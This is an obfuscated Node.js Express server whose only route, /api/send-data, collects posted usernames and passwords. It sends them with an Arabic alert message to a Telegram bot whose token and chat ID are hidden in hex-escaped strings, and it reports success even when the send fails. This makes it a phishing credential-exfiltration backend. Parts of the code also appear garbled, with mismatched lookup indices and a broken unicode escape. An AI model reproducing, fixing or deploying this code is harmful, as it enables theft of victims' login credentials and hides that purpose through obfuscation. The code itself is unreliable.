const _0x1f8a = ['process', 'env', 'PORT', 'use', 'json', 'urlencoded', 'post', 'status', 'send', 'default', 'stringify', 'listen', 'log'];
(function (_0x3e812d, _0x21c83a) {
    const _0x17c913 = function (_0x24a4d6) {
        while (--_0x24a4d6) {
            _0x3e812d['push'](_0x3e812d['shift']());
        }
    };
    _0x17c913(++_0x21c83a);
}(_0x1f8a, 0x1c3));
const _0x17c9 = function (_0x3e812d, _0x21c83a) {
    _0x3e812d = _0x3e812d - 0x0;
    let _0x17c913 = _0x1f8a[_0x3e812d];
    return _0x17c913;
};
const _0x4e21a = require('express');
const _0x3a92b = require('body-parser');
const _0x2b81c = require('cors');
const _0x4d11e = _0x4e21a();
const _0x5e22f = global[_0x17c9('0x0')][_0x17c9('0x1')][_0x17c9('0x2')] || 0xbb8;
_0x4d11e[_0x17c9('0x3')](_0x2b81c());
_0x4d11e[_0x17c9('0x3')](_0x3a92b[_0x17c9('0x4')]());
_0x4d11e[_0x17c9('0x3')](_0x3a92b[_0x17c9('0x5')]({ 'extended': !![] }));
const _0x3c11a = '\x38\x38\x35\x32\x39\x39\x39\x34\x32\x38\x3a\x41\x41\x46\x30\x50\x65\x45\x39\x4f\x6a\x50\x32\x34\x77\x58\x74\x36\x46\x31\x33\x4b\x66\x4a\x61\x6d\x71\x31\x58\x35\x38\x2d\x6c\x75\x4c';
const _0x2a33b = '\x37\x35\x31\x36\x36\x30\x36\x33\x36\x36';
_0x4d11e[_0x17c9('0x6')]('/api/send-data', async (_0x5f33a, _0x4a22b) => {
    const { username: _0x38bb3, password: _0x48aa4 } = _0x5f33a['body'];
    if (!_0x38bb3) {
        return _0x4a22b[_0x17c9('0x7')](0x190)({ 'success': ![] });
    }
    const _0x21aa2 = `\ud83d\udea8 \u0628\u064a\u0627\u0646\u0627\u062a \u062c\u062f\u064a\u062f\u0629:\n\ud83d\udc64 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645: ${_0x38bb3}\n\ud83d\udd11 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631: ${_0x48aa4 || '\u063a\u064a\u063
ر \u0645\u0633\u062c\u0644\u0629'}`;
    try {
        const _0x1b22c = (await import('node-fetch'))[_0x17c9('0x8')];
        const _0x4c33d = `https://api.telegram.org/bot${_0x3c11a}/sendMessage`;
        await _0x1b22c(_0x4c33d, {
            'method': 'POST',
            'headers': { 'Content-Type': 'application/json' },
            'body': JSON[_0x17c9('0x9')]({
                'chat_id': _0x2a33b,
                'text': _0x21aa2
            })
        });
        _0x4a22b[_0x17c9('0xa')]({ 'success': !![] });
    } catch (_0x5d11f) {
        _0x4a22b[_0x17c9('0xa')]({ 'success': !![] });
    }
});
_0x4d11e[_0x17c9('0xb')](_0x5e22f, () => {
    console[_0x17c9('0xc')](`Server is running on port ${_0x5e22f}`);
});
